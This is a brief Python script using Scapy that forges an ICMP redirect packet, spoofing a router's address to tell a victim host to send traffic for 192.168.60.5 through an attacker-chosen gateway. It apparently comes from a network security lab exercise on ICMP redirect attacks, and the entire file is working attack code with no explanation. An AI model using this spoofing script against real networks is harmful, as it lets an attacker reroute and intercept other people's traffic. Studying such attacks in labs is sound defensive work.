#!/usr/bin/python3

from scapy.all import *

ip = IP(src = '10.9.0.11', dst = '10.9.0.5')
icmp = ICMP(type = 5, code= 1)
icmp.gw = '10.9.0.111'

#original ip header
ip2 = IP(src = '10.9.0.5', dst = '192.168.60.5')
send(ip/icmp/ip2/ICMP())
